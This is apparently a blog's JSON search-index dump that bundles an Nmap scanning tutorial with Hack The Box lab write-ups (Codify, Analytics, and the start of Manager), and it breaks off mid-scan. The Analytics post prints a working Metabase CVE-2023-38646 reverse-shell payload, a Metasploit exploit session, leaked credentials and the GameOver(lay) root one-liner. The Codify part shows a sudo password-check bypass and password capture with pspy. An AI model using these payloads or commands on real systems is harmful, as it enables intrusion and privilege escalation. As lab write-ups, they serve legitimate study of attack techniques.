10.10.14.23joshua@codify:~$ We now OWN the user of the machine!From User to Root:Upon checking the sudo entries for the user Joshua, we can see that we have the ability to execute /opt/scripts/mysql-backup.shjoshua@codify:~$ sudo -lMatching Defaults entries for joshua on codify:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser joshua may run the following commands on codify:    (root) /opt/scripts/mysql-backup.shjoshua@codify:~$ While review the script we notice some flaws.#!/bin/bashDB_USER=\"root\"DB_PASS=$(/usr/bin/cat /root/.creds)BACKUP_DIR=\"/var/backups/mysql\"read -s -p \"Enter MySQL password for $DB_USER: \" USER_PASS/usr/bin/echoif [[ $DB_PASS == $USER_PASS ]]; then/usr/bin/echo \"Password confirmed!\"else/usr/bin/echo \"Password confirmation failed!\"exit 1fi/usr/bin/mkdir -p \"$BACKUP_DIR\"databases=$(/usr/bin/mysql -u \"$DB_USER\" -h 0.0.0.0 -P 3306 -p\"$DB_PASS\" -e \"SHOWDATABASES;\" | /usr/bin/grep -Ev \"(Database|information_schema|performance_schema)\")for db in $databases; do/usr/bin/echo \"Backing up database: $db\"/usr/bin/mysqldump --force -u \"$DB_USER\" -h 0.0.0.0 -P 3306 -p\"$DB_PASS\" \"$db\" |/usr/bin/gzip &gt; \"$BACKUP_DIR/$db.sql.gz\"done/usr/bin/echo \"All databases backed up successfully!\"/usr/bin/echo \"Changing the permissions\"/usr/bin/chown root:sys-adm \"$BACKUP_DIR\"/usr/bin/chmod 774 -R \"$BACKUP_DIR\"/usr/bin/echo 'Done!'      First one being the way how it compares the user-provided password and the real password. The use of == inside ` [[]] in bash, is leveraged for pattern matching instead of a direct string comparison. this can be exploited by inputting * as password, as * `matches any string and will be evaluated as true.        The second flaw is due to password being taken directly from /root/.creds. Allowing us to read the password by using any process snipping tool for instance pspy.  Let us test and see if it works.I downloaded the pspy64 binary using python server to vulnerable machine and changed the permission of the file to make it executable. password bypassI ran the pspy binary and went to another ssh session, and ran the script, providing * as the password, we see the mysqldump command being triggered in the pspy output. pspy output with passwordHere we can see the password for the root user in the pspy shell.2024/04/10 15:35:53 CMD: UID=0     PID=2415   | /usr/bin/mysql -u root -h 0.0.0.0 -P 3306 -p kljh12k3jhaskjh12kjh3 -e SHOW DATABASES; I tried switching to root user with this password and was able to authenticate as root user. password bypassWe have the machine ROOTED!"
  },
  
  {
    "title": "Demystifying Nmap Scans: A Deep Dive into Network Exploration",
    "url": "/posts/Demystifying_Nmap_Scans/",
    "categories": "Blogging, Writeup, Cybersecurity",
    "tags": "Blogging, Tutorial, Writeup",
    "date": "2024-03-31 23:00:00 +0530",
    





    
    "snippet": "IntrodutionNmap, also known as the Network Mapper, is a free and open-source tool that helps IT professionals uncover the secrets of their network as well as for security auditing. It is like a fla...",
    "content": "IntrodutionNmap, also known as the Network Mapper, is a free and open-source tool that helps IT professionals uncover the secrets of their network as well as for security auditing. It is like a flashlight that allows network discover, to see which devices are connected, what services are running on those devices (like web servers or email), and even what operating systems they are using (Windows, Linux, etc.). Nmap achieves this by sending specially crafted messages or packets across the network and analysing the responses.Nmap is not just for discovery; it is also a versatile tool for network management. Network administrators use it to keep track of devices on their network (inventory), schedule updates for services, and even monitor if devices or services are up and running. Nmap is designed for large networks, it can also be used to scan a single computer.Why do “network scanning”?Networking scanning is vital process which gives a deep view on inventory of what system and services are available in network. It allows maintaining a healthy secure and managed network.Enabling network administrators and security professional to gain a clear understating of their network to proactively identify and address any potential vulnerabilities, unauthorized devices and services that can be a point of entry for attackers.Remember, it is crucial to only scan networks with proper authorization.How Nmap Works?Imagine your network as a neighbourhood with multiple houses (devices). Nmap acts like a curious inspector who wants to know what is going on. But instead of knocking on doors directly, Nmap sends out special messages called packets. These packets travel through the network cables, reaching the different devices. By analysing how the devices respond to these packets, Nmap gathers information about them. Let us get more deeper by breaking down the concept of crafting packet and response analysis.Crafting Messages (Packets):Think of packets as little notes Nmap writes. These notes can be different depending on what Nmap wants to know. Here are some common types:      Delivery Attempt (TCP SYN packets): This is like sending a note to a house (device) saying, “Hi! I am interested, can we chat?” In the world of computers, this initiates a handshake to establish a connection. By analysing the response, Nmap can determine if the “door” (port) on the device is open (willing to chat) or closed (no answer).        Quick Check (UDP packets): Imagine throwing a pebble at a window (port) to see if someone’s home. UDP packets are quicker than TCP packets, but they do not wait for a response. If a response comes back, it suggests an open port for a service like online gaming.        Simple Ping (ICMP Echo Request): This is like calling out, “Hello? Is anyone there?” A ping packet is used to see if a device is even switched on and “listening” on the network.  Understanding the Responses:Once Nmap sends its packets, it carefully listens to the replies from the devices. Here is what it is trying to understand:      Open or Closed Door (Port Status): Based on the response, Nmap can tell if a port on a device is open (like an open door - ready to communicate), closed (no answer), filtered (maybe blocked by a security guard - firewall), or unreachable (the house might be empty - device is off).        Who’s Living There? (Service Identification): Sometimes, the response from an open port reveals clues about the service running on that port (like a name tag on the door). For instance, a specific response might indicate a web server or an email service.        What Kind of House? (Operating System Detection): Nmap analyses various details in the response, like how the device responds to certain requests or the way it formats its messages. This can provide hints about the operating system running on the device (like the architectural style of the house), but it is not always foolproof.  Back to Networking Basics | Explaining TCP and UDP Connections.To really explain the handshake, we would need to talk a little more about how computers talk on networks, like how they break information into pieces and make sure everything arrives safely.TCP (Transmission Control Protocol):Imagine TCP as a reliable postal service for your computer. It guarantees data delivery in order and without errors. Unlike throwing a message in a bottle, TCP ensures the recipient gets it and acknowledges receipt.Packets and Sequence Numbers:Data on a network travel in small chunks called packets. TCP assigns a sequence number to each packet it sends. This helps the receiver order the packets correctly and identify any missing ones.The 3-Way Handshake:TCP handshake, also known as the three-way handshake, is a fundamental process in establishing a reliable connection between two devices on a network using the Transmission Control Protocol (TCP). It ensures both devices are synchronized and ready to exchange data accurately.  Client initiates connection (SYN): The client, wanting to communicate with a server, sends a segment with the SYN flag set. This flag signifies the client’s intent to initiate communication and includes an initial sequence number the client will use for data packets.  Server acknowledges and synchronizes (SYN-ACK): Upon receiving the SYN packet, the server acknowledges the connection request by sending a segment with both SYN and ACK flags set. The SYN flag indicates the server’s readiness to connect, and the ACK flag acknowledges the client’s sequence number. The server also includes its own initial sequence number in this packet.  Client acknowledges server (ACK): Finally, the client sends a segment back with just the ACK flag set, acknowledging the server’s sequence number and completing the handshake. TCP handshakeBy exchanging these packets, both client and server establish synchronized sequence numbers for tracking data packets and ensuring reliable data exchange.TCP handshake acts like a virtual handshake between devices, confirming their readiness to communicate before any data is transferred. This ensures a reliable and orderly flow of information.  TCP connections are full duplex, meaning data can flow in both directions simultaneously.  The handshake is used for both connection establishment and termination (with FIN flags).User Datagram Protocol:UDP (User Datagram Protocol), is like a fast courier service for your computer. Unlike TCP (Transmission Control Protocol), which acts like a reliable postal service, UDP prioritizes speed over guaranteed delivery.  No Connections:  As mentioned in above analogy, throwing a pebble is a fast way to see if someone’s home, UDP packets transmits datagram (packets) straight to the target device without setting a connection. As UDP do not waste time establishing a connection, making them efficient for tasks that need a fast response, like checking if a service is available.  No Waiting for Response: Like how you would not wait forever for someone to answer the window, UDP does not wait for an acknowledgement. It simply sends the data (the pebble) and moves on. It does not care if someone is there to catch it (receive the packet).  Open Port: If you see a light turn on inside the house (like a response coming back), it indicates the “window” (port) is open and someone is there (service is available). This is useful for applications like online gaming, where finding available servers quickly is important. Here is how it relates to ports:          Imagine the house is a computer, and each window represents a different service running on that computer.      The port number is like the address of that specific window.      Throwing a pebble (UDP packet) at a specific window (port) is like checking if that service is available.      If a response comes back (light turns on), it suggests the service is up and running on that port.       UDP dataframeInital Scan:Now that we have covered some fundamental network concepts, let us delve deeper into Nmap scanning. To illustrate, we will target scanme.nmap.org a learning resource created by Fyodor (Gordon Lyon).The basic command to being with nmap is `nmap , where target can be an IP address, domain, or a range of address, for example:nmap scanme.nmap.orgThe above command will direct nmap to scan default 1000 most used ports of our target scanme.nmap.org. The scan result may include well known ports like 21(FTP),22(SSH),80(HTTP), 443(HTTPS), and many other ports that are frequently targeted by attackers. The key idea is to use nmap to identify which of these ports are open on a target device revelling what services are running and any potential vulnerability that can be exploited.┌──(kasyap㉿Brahma)-[~]└─$ nmap scanme.nmap.orgStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-01 15:20 ISTNmap scan report for scanme.nmap.org (45.33.32.156)Host is up (0.26s latency).Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2fNot shown: 993 closed tcp ports (conn-refused)PORT      STATE    SERVICE22/tcp    open     ssh25/tcp    filtered smtp80/tcp    open     http135/tcp   filtered msrpc139/tcp   filtered netbios-ssn9929/tcp  open     nping-echo31337/tcp open     EliteNmap done: 1 IP address (1 host up) scanned in 20.62 secondsThis basic scan provides minimal details. To gather more information, such as operating system or service version, additional flags can be used.For example, the -sV flag reveals version details. We will explore more advanced flags later.┌──(kasyap㉿Brahma)-[~]└─$ nmap scanme.nmap.org -sVStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-01 16:13 ISTNmap scan report for scanme.nmap.org (45.33.32.156)Host is up (0.26s latency).Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2fNot shown: 993 closed tcp ports (conn-refused)PORT      STATE    SERVICE     VERSION22/tcp    open     ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)25/tcp    filtered smtp80/tcp    open     http        Apache httpd 2.4.7 ((Ubuntu))135/tcp   filtered msrpc139/tcp   filtered netbios-ssn9929/tcp  open     nping-echo  Nping echo31337/tcp open     tcpwrappedService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 29.90 secondsInterpreting Scan Results:Interpreting Nmap scan results is like deciphering a coded message. By analysing the scanned ports, their open or closed state, and the services running on those ports, along with any version information, you can paint a picture of what is running on a device. This can reveal valuable information such as the operating system, potential vulnerabilities, and what services are accessible on the network. By piecing together these details, you gain a deeper understanding of the network’s security posture.Here are some key considerations.Port States:  Open ports: Signifying active services listening for connections. Finding these is often the primary goal of port scanning. Security-conscious individuals understand that each open port is an avenue for attack.  Closed ports: while not actively used, can indicate potential services that could be deployed.  Filtered ports: Nmap cannot determine whether the port is open because packet filtering prevents its probes from reaching the port. The filtering could be from a dedicated firewall device, router rules, or host-based firewall software.  Unfiltered ports: The unfiltered state means that a port is accessible, but Nmap is unable to determine whether it is open or closed.Services and versions:It is crucial to identify the services running and their versions on open ports. This enables us to pinpoint any security vulnerabilities that can be exploited by attackers.For instance, from our previous example with the version scan, we were able to identify the version of Apache listening on port 80 (HTTP). A security-conscious individual can then search for any CVEs (Common Vulnerabilities and Exposures) or vulnerabilities associated with that specific version of Apache. This information empowers us to adopt security measures, like patching vulnerabilities, to mitigate potential risks.Scan Techniques:Previously we described basic scan method, including a summary on version scan and how it can be used to identify any vulnerable services that need to be mitigated.  Here we will go deeper into different scan types and later into advanced scan technique.TCP Connect Scan (-sT):TCP connect scan is default TCP scan type when a user does not have enough privileges to utilize raw packets or scanning IPv6 networks. In this approach, Nmap leverages the operating system’s connect system call to establish a connection with the target machine’s port. While this scan can be considered more reliable with port scan. However, as this scan completes three-way handshake, target machines are more likely to log the connection. Additionally, If we scan without targeting a specific port by default TCP connect scan will scan all the ports from 0 to 65535, making it more time consuming.The below image shows a connect scan in action against open port 22 (SSH) of scanme.nmap.org. Connect Scan, image credit: nmap.orgHere the client (Kard) initiates the connection by sending a SYN packet to the target system (scanme). The target system responds with a SYN/ACK packet, and then the client sends an ACK packet to establish the connection. During this process, the target system may send additional information, such as an SSH banner string (e.g., \"SSH-1.99-OpenSSH_3.1p1\\n\"), providing insights into the service running on the open port. As soon as Nmap confirms the successful establishment of the connection through its host OS, it terminates the connection by sending FIN packet.Below a sample output of a connect scan.┌──(kasyap㉿Brahma)-[~]└─$ nmap -sT scanme.nmap.orgStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-01 21:24 ISTNmap scan report for scanme.nmap.org (45.33.32.156)Host is up (0.26s latency).Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2fNot shown: 993 closed tcp ports (conn-refused)PORT      STATE    SERVICE22/tcp    open     ssh25/tcp    filtered smtp80/tcp    open     http135/tcp   filtered msrpc139/tcp   filtered netbios-ssn9929/tcp  open     nping-echo31337/tcp open     EliteNmap done: 1 IP address (1 host up) scanned in 14.28 secondsThe -sToption could have been omitted since Nmap is being run from a non-privileged account so connect scan is the default type.SYN Stealth Scan (-sS):SYN scan is the default and most popular Nmap scan option. However, to enable this scan the user typically needs standard user privileges (not necessarily root). While raw socket access can sometimes enhance performance, it is not essential for SYN scans.Compared to connect scans, SYN scans are faster because they do not complete the three-way handshake. On an unencumbered network (without firewalls or IDS), they can process ports quicker. Earning its nickname “stealth scan,” a SYN scan avoids establishing a full connection, potentially making it less conspicuous. Additionally, it provides clear differentiation between open, closed, and filtered ports. SYN Scan, image credit: nmap.orgAs shown in the example above, the first two steps (SYN and SYN/ACK) are the same as with a connect scan. However, instead of sending an ACK packet in response to the SYN/ACK sent by the target system (scanme), the client (Kard) responds with an RST packet, which terminates the connection attempt instead of establishing it. Ideally, if we do not send an RST packet to scanme, it will assume that there was a connection drop and keep sending SYN/ACK until it times out eventually. This way, the three-way handshake is never completed, hence SYN scan is sometimes called half-open scanning.”Below a sample output of a SYN scan.┌──(root㉿Brahma)-[/home/kasyap]└─# nmap -sS scanme.nmap.orgStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-03 16:28 ISTNmap scan report for scanme.nmap.org (45.33.32.156)Host is up (0.26s latency).Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2fNot shown: 993 closed tcp ports (reset)PORT      STATE    SERVICE22/tcp    open     ssh25/tcp    filtered smtp80/tcp    open     http135/tcp   filtered msrpc139/tcp   filtered netbios-ssn9929/tcp  open     nping-echo31337/tcp open     EliteNmap done: 1 IP address (1 host up) scanned in 5.26 secondsUDP Scan (-sU):Even though most internet services run on TCP, UDP also plays a vital role. Common examples include DNS (port 53), SNMP (ports 161/162), and DHCP (ports 67/68). While UDP scans are slower and trickier than TCP scans, some security professionals ignore UDP ports altogether. This is a mistake! Hackers target vulnerabilities in UDP services, and Nmap can help you identify those ports.To perform a UDP scan with Nmap, use the -sU option. You can even combine it with a TCP scan type (like SYN scan with -sS) to check both protocols at once.Here’s how UDP scanning works:Nmap sends a UDP packet to each port you specify. Most packets are empty, but some well-known ports might receive a specific payload. Based on the response (or lack thereof), Nmap classifies the port into one of four states:      Open: If a UDP packet is received in response to the scan packet, it indicates an open port with a service potentially listening on it.        Closed: If an ICMP Port Unreachable message (type 3, code 3) is received, it signifies a closed port. This response implies the port is not in use and is filtering incoming packets. In some cases, the target device might not be configured to send ICMP messages for unreachable ports. The lack of any response (timeout) after a retransmission attempt might also suggest a closed port, but it is less conclusive than receiving an ICMP message.        Filtered: If an ICMP message other than “Port Unreachable” (type 3, code 3) is received (e.g., ICMP message indicating a general network issue), it suggests a filter or security system might be blocking the scan packet, making it difficult to determine the actual port state (open or closed).        Open-Filtered:If no response is received after a retransmission attempt and there is no ICMP message to clarify, the port state is classified as “open|filtered.” This indicates ambiguity; the port could be open and not responding (silent service), or it could be filtered by a security system.  Below a sample output of a UDP scan.root@Brahma:/home/kasyap# nmap -sU scanme.nmap.orgStarting Nmap 7.80 ( https://nmap.org ) at 2024-04-06 19:27 ISTStats: 0:00:28 elapsed; 0 hosts completed (1 up), 1 undergoing UDP ScanUDP Scan Timing: About 3.61% done; ETC: 19:41 (0:12:54 remaining)Nmap scan report for scanme.nmap.org (45.33.32.156)Host is up (0.26s latency).Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2fNot shown: 991 closed portsPORT    STATE         SERVICE68/udp  open|filtered dhcpc123/udp open          ntp135/udp open|filtered msrpc136/udp open|filtered profile137/udp open|filtered netbios-ns138/udp open|filtered netbios-dgm139/udp open|filtered netbios-ssn162/udp open|filtered snmptrap445/udp open|filtered microsoft-dsNmap done: 1 IP address (1 host up) scanned in 1089.19 secondsTCP FIN, NULL, and Xmas Scans (-sF, -sN, -sX):These are advanced TCP scan techniques used in Nmap with specific flags (-sF, -sN, -sX) to probe ports and potentially bypass basic filtering mechanisms. However, it’s important to understand that they are less reliable than standard scans and may not always provide accurate results. Here is a breakdown of each:TCP FIN Scan (-sF)Nmap sends a TCP segment with only the FIN flag set. This flag typically indicates the end of a connection. Aiming to exploit firewalls or filters that might allow FIN packets to pass through while blocking standard connection attempts.By sending a FIN packet, the scanner hopes the target might respond with an RST (reset) packet, revealing information about the port state (open or closed).  Limitations:          Firewalls might not respond to unexpected FIN packets, making interpretation difficult.      Only differentiates between open and closed ports, not filtered ones.      Firewalls and IDS systems might recognize this as a scan attempt.      TCP NULL Scan (-sN)Nmap sends a TCP segment with no flags set (empty header), trying to bypass firewalls that filter based on flags in the TCP header. A completely empty packet might be allowed through, and the target’s response (RST or no response) could provide clues about the port state.  Limitations:          Target behaviour is unpredictable, making interpretation of responses challenging.      Like FIN scan, it might only distinguish open/closed ports.      Firewalls and IDS systems are likely to flag such unusual packets.      Xmas Scan (-sX)Nmap sends a TCP segment with all flags set (FIN, SYN, PSH, URG, RST, ACK). This combination resembles a string of Christmas lights, hence the name. Like NULL scans, this aims to exploit firewalls that filter based on specific flag combinations. The scanner hopes for a response that might reveal the port state.  Limitations:          Target behaviour is highly unpredictable, making response interpretation almost impossible.      Provides extraordinarily little value in determining port states.      Firewalls and IDS systems are likely to identify this as a suspicious scan attempt.      Below sample for FIN Scan where, I have specifed the ports 25,135,139 using -p flag. The output for NULL and Xmas are the same as what we get in FIN.root@Brahma:/home/kasyap# nmap -sF -p 25,135,139 scanme.nmap.orgStarting Nmap 7.80 ( https://nmap.org ) at 2024-04-06 20:49 ISTNmap scan report for scanme.nmap.org (45.33.32.156)Host is up (0.25s latency).Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2fPORT    STATE         SERVICE25/tcp  open|filtered smtp135/tcp open|filtered msrpc139/tcp open|filtered netbios-ssnNmap done: 1 IP address (1 host up) scanned in 3.91 seconds"
  },
  
  {
    "title": "Hack The Box | Analytics Writeup",
    "url": "/posts/htb-analytics-writeup/",
    "categories": "Blogging, Writeup, Hack The Box",
    "tags": "Analytics, HTB, Writeup, Easy",
    "date": "2024-03-23 23:00:00 +0530",
    





    
    "snippet": "Summary:Analytics is a vulnerable Linux machine on HackTheBox. Basic web enumeration techniques expose a login page on a Metabase subdomain.This subdomain is exploitable through a known vulnerabili...",
    "content": "Summary:Analytics is a vulnerable Linux machine on HackTheBox. Basic web enumeration techniques expose a login page on a Metabase subdomain.This subdomain is exploitable through a known vulnerability CVE-2023-38646 allowing attackers to gain a foothold.Privilege escalation to root user is achieved by exploiting another vulnerability called gameoverlay on the system.Enumeration:Port Scan:Lets start with nmap scan to discover some open ports.# Nmap 7.80 scan initiated Sat Mar 23 13:40:02 2024 as: nmap -sV -sC -oA analytics 10.129.229.224Nmap scan report for analytical.htb (10.129.229.224)Host is up (0.050s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)80/tcp open  http    nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: AnalyticalService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Mar 23 13:40:12 2024 -- 1 IP address (1 host up) scanned in 9.36 secondsWith port scan we have port 22 and port 80 open, which is default for SSH and HTTP services, respectively.WebI went ahead and browsed the host by pasting in the IP address as we have HTTP service running which resolved to http://analytical.htb/.I swiftly added the host  analytical.htb to /etc/hosts and went back to web application for further enumeration. analytical.htbAs we see there is an option that allow login to the web application, upon visiting the page I was redirected to another page  http:///data.analytical.htb/.To view the page, we need to add the host to our /etc/hosts. data.analytical.htbNow, as we have the host entry in place, we can see it is a metabase login page.  Metabase: is an open-source business intelligence platform. You can use Metabase to ask questions about your data, or embed Metabase in your app to let your customers explore their data on their own.Foothold:With some online research, I was able to find a recent vulnerability [CVE-2023-38646] (https://nvd.nist.gov/vuln/detail/CVE-2023-38646). This vulnerability allowed attackers to remotely execute commands on the server running Metabase, without needing any authentication. This means attackers could gain full control of the server if it were vulnerable.With further research, I was able to identify a PoC, which allowed me to gain reverse shell by parsing payload to /api/setup/validate.Additionally, there is an alternative method I was able to get reverse shell using Metasploit as well.Let us dive deep into each method!Method 1:  Manually following PoC.As described in PoC we would need to obtain the setup token from /api/session/properties. Setup TokenAs we have the setup token, we need to replace it in payload with token value.{     \"token\": \"&lt;Setup-Token&gt;”,     \"details\":     {         \"is_on_demand\": false,         \"is_full_sync\": false,         \"is_sample\": false,         \"cache_ttl\": null,         \"refingerprint\": false,         \"auto_run_queries\": true,         \"schedules\":         {},         \"details\":         {             \"db\": \"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec('bash -c {echo,&lt;you shell payload&gt;}|{base64,-d}|{bash,-i}')\\n$$--=x\",             \"advanced-options\": false,             \"ssl\": true         },         \"name\": \"an-sec-research-team\",         \"engine\": \"h2\"     } } Now, we needs to encode the reverse shell payload into base64, with your own IP and port, before parsing it. Complete PayloadAs you can see, we have a reverse shell. NC - Reverse ShellMethod 2: Metasploit ModuleWith msfconsole (Metasploit) I went ahead and searched for the CVE which revealed a module that can be used to exploit this vulnerability.msf6 &gt; search CVE-2023-38646Matching Modules================   #  Name                                         Disclosure Date  Rank       Check  Description   -  ----                                         ---------------  ----       -----  -----------   0  exploit/linux/http/metabase_setup_token_rce  2023-07-22       excellent  Yes    Metabase Setup Token RCEInteract with a module by name or index. For example info 0, use 0 or use exploit/linux/http/metabase_setup_token_rceI went ahead and configured the Metasploit module as necessary and executed the payload with a run command which gave a reverse shell.msf6 &gt; use exploit/linux/http/metabase_setup_token_rce[*] Using configured payload cmd/unix/reverse_bashmsf6 exploit(linux/http/metabase_setup_token_rce) &gt; show optionsModule options (exploit/linux/http/metabase_setup_token_rce):   Name       Current Setting  Required  Description   ----       ---------------  --------  -----------   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html   RPORT      3000             yes       The target port (TCP)   SSL        false            no        Negotiate SSL/TLS for outgoing connections   TARGETURI  /                yes       The URI of the Metabase Application   VHOST                       no        HTTP server virtual hostPayload options (cmd/unix/reverse_bash):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST                   yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen portExploit target:   Id  Name   --  ----   0   Automatic TargetView the full module info with the info, or info -d command.msf6 exploit(linux/http/metabase_setup_token_rce) &gt; set RHOST data.analytical.htbRHOST =&gt; data.analytical.htbmsf6 exploit(linux/http/metabase_setup_token_rce) &gt; set RPORT 80RPORT =&gt; 80msf6 exploit(linux/http/metabase_setup_token_rce) &gt; set LHOST tun0LHOST =&gt; 10.10.14.50msf6 exploit(linux/http/metabase_setup_token_rce) &gt; run[*] Started reverse TCP handler on 10.10.14.50:4444 [*] Running automatic check (\"set AutoCheck false\" to disable)[+] The target appears to be vulnerable. Version Detected: 0.46.6[+] Found setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f[*] Sending exploit (may take a few seconds)[*] Command shell session 1 opened (10.10.14.50:4444 -&gt; 10.129.229.224:47972) at 2024-03-23 14:11:07 +0530whoamimetabaseshellPrivilege Escalation:To User Access:Now, we are inside the machine, however I was not able to find any relevant that we could use nor a user flag.While wondering around enumerating further I checked the /proc/self/environ which gave out credentials for metalytics user.MB_LDAP_BIND_DN=LANGUAGE=en_US:enUSER=metabaseHOSTNAME=2a375e88e680FC_LANG=en-USSHLVL=5LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../libHOME=/home/metabaseMB_EMAIL_SMTP_PASSWORD=LC_CTYPE=en_US.UTF-8JAVA_VERSION=jdk-11.0.19+7LOGNAME=metabase_=/bin/shMB_DB_CONNECTION_URI=PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binMB_DB_PASS=MB_JETTY_HOST=0.0.0.0META_PASS=An4lytics_ds20223#LANG=en_US.UTF-8MB_LDAP_PASSWORD=SHELL=/bin/shMB_EMAIL_SMTP_USERNAME=MB_DB_USER=META_USER=metalyticsLC_ALL=en_US.UTF-8JAVA_HOME=/opt/java/openjdkPWD=/MB_DB_FILE=//metabase.db/metabase.dbUsing the password An4lytics_ds20223#, I was able to login to the machine through SSH. _SSH: metalytics _We now own the user of the machine!.From User to Root:Upon gaining initial access to the Analytical server as the metalytics user, trying to escalate the privilege to root I initially tried Sudo –l command.However, it gave that we do not have permission to run sudo on this machine. sudo -lFurther I checked if we have any vulnerability related to OS, so I enter the command uname-a to check system information related to Kernel Release Version, OS. uname -aWhich revealed that the machine is running on 6.2.0-25-generic kernel version.  With short online research I could find that this version of kernel version is vulnerable to CVE-2023-2640 and CVE-2023-32629 “GameOver(lay) Ubuntu Privilege Escalation”.Simply by pasting the payload mentioned in exploit.sh file in machine, we will be elevated to root.unshare -rm sh -c \"mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;\" &amp;&amp; u/python3 -c 'import os;os.setuid(0);os.system(\"cp /bin/bash /var/tmp/bash &amp;&amp; chmod 4755 /var/tmp/bash &amp;&amp; /var/tmp/bash -p &amp;&amp; rm -rf l m u w /var/tmp/bash\")' rootedWe have the machine ROOTED!"
  },
  
  {
    "title": "Hack The Box | Manager Writeup",
    "url": "/posts/htb-manager-writeup/",
    "categories": "Blogging, Writeup, Hack The Box",
    "tags": "Manager, HTB, Writeup",
    "date": "2024-03-16 23:00:00 +0530",
    





    
    "snippet": "Summary:Manager, a medium difficulty Windows machine, acts as a domain controller with Active Directory and additional services like a web server and an SQL server.The attack starts by exploiting a...",
    "content": "Summary:Manager, a medium difficulty Windows machine, acts as a domain controller with Active Directory and additional services like a web server and an SQL server.The attack starts by exploiting a common weakness RID cycling to enumerate user accounts. Then, a password spraying attack specifically targets the MSSQL service to crack weak passwords.Once inside the SQL server, the attacker leverages the potentially vulnerable stored procedure xp_dirtree, revealing a website backup containing credentials.These credentials grant access to the server using the Windows Remote Management (WinRM) protocol. Finally, the attacker exploits a known vulnerability ESC7 in Active Directory Certificate Services (AD CS) to escalate privileges and gain full control of the systemEnumeration:Port Scan:Lets start with nmap scan to discover some open ports.# Nmap 7.94SVN scan initiated Wed Mar 13 17:44:46 2024 as: nmap -sV -sC -oA manager 10.129.220.106Nmap scan report for 10.129.220.106Host is up (0.050s latency).Not shown: 989 filtered tcp ports (no-response)PORT     STATE SERVICE       VERSION53/tcp   open  domain        Simple DNS Plus80/tcp   open  http          Microsoft IIS httpd 10.0|_http-title: Manager|_http-server-header: Microsoft-IIS/10.0| http-methods: |_  Potentially risky methods: TRACE88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-13 19:14:29Z)135/tcp  open  msrpc         Microsoft Windows RPC139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn445/tcp  open  microsoft-ds?464/tcp  open  kpasswd5?593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.01433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM| ms-sql-ntlm-info: |   10.129.220.106:1433: |     Target_Name: MANAGER|     NetBIOS_Domain_Name: MANAGER|     NetBIOS_Computer_Name: DC01|     DNS_Domain_Name: manager.htb|     DNS_Computer_Name: dc01.manager.htb|     DNS_Tree_Name: manager.htb|_    Product_Version: 10.0.17763| ms-sql-info: |   10.129.220.106:1433: |     Version: |       name: Microsoft SQL Server 2019 RTM|       number: 15.00.2000.00|       Product: Microsoft SQL Server 2019|       Service pack level: RTM|       Post-SP patches applied: false|_    TCP port: 1433|_ssl-date: 2024-03-13T19:15:51+00:00; +6h59m32s from scanner time.| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2024-03-13T18:57:57|_Not valid after:  2054-03-13T18:57:573268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc01.manager.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb| Not valid before: 2023-07-30T13:51:28|_Not valid after:  2024-07-29T13:51:28|_ssl-date: 2024-03-13T19:15:51+00:00; +6h59m32s from scanner time.3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)|_ssl-date: 2024-03-13T19:15:50+00:00; +6h59m32s from scanner time.| ssl-cert: Subject: commonName=dc01.manager.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb| Not valid before: 2023-07-30T13:51:28|_Not valid after:  2024-07-29T13:51:28Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: 